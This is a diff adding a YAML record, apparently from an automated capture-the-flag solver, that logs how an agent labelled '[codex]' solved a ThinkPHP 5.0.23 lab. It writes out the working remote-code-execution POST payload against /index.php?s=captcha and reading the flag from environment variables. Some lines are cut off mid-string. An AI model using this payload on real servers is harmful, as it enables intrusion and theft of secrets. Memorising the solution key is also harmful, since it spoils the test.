@@ -1,0 +1,30 @@
+name: '[ThinkPHP]5.0.23-Rce'
+category: web
+keywords:
+- thinkphp
+- rce
+- github
+- vulhub
+- tree
+- master
+steps:
+- ThinkPHP 5.0.23 RCE via POST /index.php?s=captcha body '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=<cmd>'
+  executes as www-data; FLAG is exported in the web process env (printenv shows it).
+- '[codex] Target is ThinkPHP 5.0.23 (PHP 7.2.12, Apache/2.4.25 Debian); POST `/index.php?s=captcha`
+  with `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=<cmd>`
+  gives RCE as `uid=33(www-da'
+- '[codex] FLAG is exported in the web process environment; `printenv` returns it
+  (also re-confirmed via `echo ''$FLAG''` -> MARKER output).'
+- '[codex] Blackboard DB env var `MUTEKI_BLACKBOARD_DB` contains a literal backslash
+  (`graph\upstream_shared_graph.db`); point it at `graph/upstream_shared_graph.db`
+  or `blackboard.py` fails with `no such table:'
+- '[codex] FOUND_FLAG=<FLAG>'
+evidence_chain:
+- ThinkPHP 5.0.23 RCE via POST /index.php?s=captcha body '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=<cmd>'
+  executes as www-data; FLAG is exported in the web process env (printenv shows it).
+- '[codex] Target is ThinkPHP 5.0.23 (PHP 7.2.12, Apache/2.4.25 Debian); POST `/index.php?s=captcha`
+  with `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=<cmd>`
+  gives RCE as `uid=33(www-da'
+success_format: CTF2\{[^}]+\}
+source: 300caa53-35bc-4150-b726-74e93876ccaf (solver 5129e2e0-2086-46f1-beac-4c7fb4564dbf)
+notes: ''
